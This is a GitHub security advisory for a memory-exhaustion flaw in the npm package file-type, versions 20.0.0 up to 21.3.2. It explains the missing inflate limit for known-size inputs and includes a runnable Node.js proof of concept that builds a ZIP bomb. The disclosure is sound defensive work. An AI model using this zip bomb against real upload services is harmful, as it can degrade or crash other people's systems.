# [M] file-type: ZIP Decompression Bomb DoS via [Content_Types].xml entry

## Summary
Severity: Medium
Advisory: GHSA-j47w-4g3g-c36v
CVE: CVE-2026-32630
CWE: CWE-400, CWE-409
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-j47w-4g3g-c36v
Type: github-advisory

## Affected
- npm: `file-type` — affected >=20.0.0 <21.3.2

## Details
## Summary

A crafted ZIP file can trigger excessive memory growth during type detection in `file-type` when using `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()`.

In affected versions, the ZIP inflate output limit is enforced for stream-based detection, but not for known-size inputs. As a result, a small compressed ZIP can cause `file-type` to inflate and process a much larger payload while probing ZIP-based formats such as OOXML. In testing on `file-type` `21.3.1`, a ZIP of about `255 KB` caused about `257 MB` of RSS growth during `fileTypeFromBuffer()`.

This is an availability issue. Applications that use these APIs on untrusted uploads can be forced to consume large amounts of memory and may become slow or crash.

## Root Cause

The ZIP detection logic applied different limits depending on whether the tokenizer had a known file size.

For stream inputs, ZIP probing was bounded by `maximumZipEntrySizeInBytes` (`1 MiB`). For known-size inputs such as buffers, blobs, and files, the code instead used `Number.MAX_SAFE_INTEGER` in two relevant places:

```js
const maximumContentTypesEntrySize = hasUnknownFileSize(tokenizer)
	? maximumZipEntrySizeInBytes
	: Number.MAX_SAFE_INTEGER;
```

and:

```js
const maximumLength = hasUnknownFileSize(this.tokenizer)
	? maximumZipEntrySizeInBytes
	: Number.MAX_SAFE_INTEGER;
```

Together, these checks allowed a crafted ZIP to bypass the intended inflate limit for known-size APIs and force large decompression during detection of entries such as `[Content_Types].xml`.

## Proof of Concept

```js
import {fileTypeFromBuffer} from 'file-type';
import archiver from 'archiver';
import {Writable} from 'node:stream';

async function createZipBomb(sizeInMegabytes) {
	return new Promise((resolve, reject) => {
		const chunks = [];
		const writable = new Writable({
			write(chunk, encoding, callback) {
				chunks.push(chunk);
				callback();
			},
		});

		const archive = archiver('zip', {zlib: {level: 9}});
		archive.pipe(writable);
		writable.on('finish', () => {
			resolve(Buffer.concat(chunks));
		});
		archive.on('error', reject);

		const xmlPrefix = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">';
		const padding = Buffer.alloc(sizeInMegabytes * 1024 * 1024 - xmlPrefix.length, 0x20);
		archive.append(Buffer.concat([Buffer.from(xmlPrefix), padding]), {name: '[Content_Types].xml'});
		archive.finalize();
	});
}

const zip = await createZipBomb(256);
console.log('ZIP size (KB):', (zip.length / 1024).toFixed(0));

const before = process.memoryUsage().rss;
await fileTypeFromBuffer(zip);
const after = process.memoryUsage().rss;

console.log('RSS growth (MB):', ((after - before) / 1024 / 1024).toFixed(0));
```

Observed on `file-type` `21.3.1`:
- ZIP size: about `255 KB`
- RSS growth during detection: about `257 MB`

## Affected APIs

Affected:
- `fileTypeFromBuffer()`
- `fileTypeFromBlob()`
- `fileTypeFromFile()`

Not affected:
- `fileTypeFromStream()`, which already enforced the ZIP inflate limit for unknown-size inputs

## Impact

Applications that inspect untrusted uploads with `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()` can be forced to consume excessive memory during ZIP-based type detection. This can degrade service or lead to process termination in memory-constrained environments.

## Cause

The issue was introduced in 399b0f1

## References
- https://github.com/sindresorhus/file-type/security/advisories/GHSA-j47w-4g3g-c36v
- https://nvd.nist.gov/vuln/detail/CVE-2026-32630
- https://github.com/sindresorhus/file-type/commit/399b0f156063f5aeb1c124a7fd61028f3ea7c124
- https://github.com/sindresorhus/file-type/commit/a155cd71323279de173c54e8c530d300d3854fdd
- https://github.com/sindresorhus/file-type
- https://github.com/sindresorhus/file-type/releases/tag/v21.3.2
